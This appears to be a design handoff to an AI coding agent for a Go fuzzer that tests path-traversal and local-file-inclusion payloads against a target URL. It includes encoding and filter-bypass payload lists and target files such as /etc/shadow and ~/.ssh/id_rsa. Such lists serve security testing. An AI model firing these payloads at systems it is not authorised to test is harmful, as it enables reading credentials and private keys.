# GEMINI HANDOFF: Go LFI Fuzzer

**Date:** 2026-01-20  
**Priority:** HIGH  
**Estimated Time:** 2 days  
**Scope:** Create a high-performance Go tool for LFI/Path Traversal payload testing

---

## 🎯 OBJETIVO

Crear un fuzzer LFI en **Go** para probar cientos de path traversal payloads:

- Depth traversal (../, ..\..\, etc.)
- Encoding bypasses (..%2f, %252e%252e, etc.)
- Null byte injection (%00)
- Filter bypasses (....// , ..\..//, etc.)

---

## 📊 IMPACTO ESPERADO

| Métrica | Python Actual | Go Propuesto | Mejora |
|---------|---------------|--------------|--------|
| Paths testeados | ~30 | ~300+ | 10x cobertura |
| Tiempo (100 URLs) | ~25 seg | ~2 seg | 12x más rápido |
| OS detection | Manual | Auto-detect | Smarter |

---

## 📋 ESPECIFICACIÓN

### CLI Interface

```bash
./go-lfi-fuzzer \
    -u "https://target.com/view?file=FUZZ" \
    -c 100 \
    -t 5 \
    --os linux \                # linux/windows/both
    --depth 10 \                # Max traversal depth
    --encoding all \            # none/url/double/all
    --json
```

### Output Format

```json
{
    "metadata": {
        "target": "https://target.com/view?file=",
        "os_detected": "linux",
        "total_payloads": 320,
        "duration_ms": 1800
    },
    "hits": [
        {
            "payload": "....//....//....//etc/passwd",
            "file_found": "/etc/passwd",
            "evidence": "root:x:0:0:root:/root:/bin/bash",
            "encoding": "filter_bypass",
            "severity": "CRITICAL"
        },
        {
            "payload": "..%2f..%2f..%2fWindows/win.ini",
            "file_found": "win.ini",
            "evidence": "[fonts]",
            "encoding": "url_encoded",
            "severity": "HIGH"
        }
    ]
}
```

---

## 🔧 PAYLOADS INCLUIDOS

### Linux Targets (~40)

```
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log
/var/log/nginx/access.log
~/.bash_history
~/.ssh/id_rsa
```

### Windows Targets (~30)

```
C:/Windows/win.ini
C:/Windows/System32/drivers/etc/hosts
C:/Users/Administrator/Desktop/
C:/inetpub/logs/LogFiles/
C:/boot.ini
```

### Traversal Depths (1-10 levels)

```
../
../../
../../../
# ... up to 10 levels
```

### Encoding Bypasses (~50)

```
..%2f
..%252f
%2e%2e%2f
%2e%2e/
....//
..../
..\../
..\/
```

### Filter Bypasses (~30)

```
....//....//
..../..../
....\/....\/
..%00/
%00../
```

---

## 🔗 INTEGRACIÓN CON PYTHON

```python
# bugtrace/tools/external.py
async def run_go_lfi_fuzzer(url: str, param: str, os_hint: str = "both") -> Dict:
    binary_path = settings.TOOLS_DIR / "bin" / "go-lfi-fuzzer"
    
    fuzz_url = url.replace(f"{param}=", f"{param}=FUZZ")
    
    cmd = [
        str(binary_path),
        "-u", fuzz_url,
        "-c", "100",
        "--os", os_hint,
        "--depth", "8",
        "--encoding", "all",
        "--json"
    ]
    
    # ... execute and parse JSON
```

---

## ✅ DETECCIÓN DE ÉXITO

1. **File signatures:**
   - Linux: `root:x:0:0`, `[boot loader]`, `HTTP_`
   - Windows: `[fonts]`, `[boot loader]`, `[operating systems]`
2. **Response length differential:** Significant increase vs baseline
3. **Error messages:** "file not found" → "permission denied" = file exists!

---

## 📁 FILES

| File | Action |
|------|--------|
| `tools/go-lfi-fuzzer/main.go` | Create |
| `tools/go-lfi-fuzzer/fuzzer/lfi.go` | Create |
| `tools/go-lfi-fuzzer/payloads/` | Create (embedded) |
| `bugtrace/agents/lfi_agent.py` | Modify (integrate) |
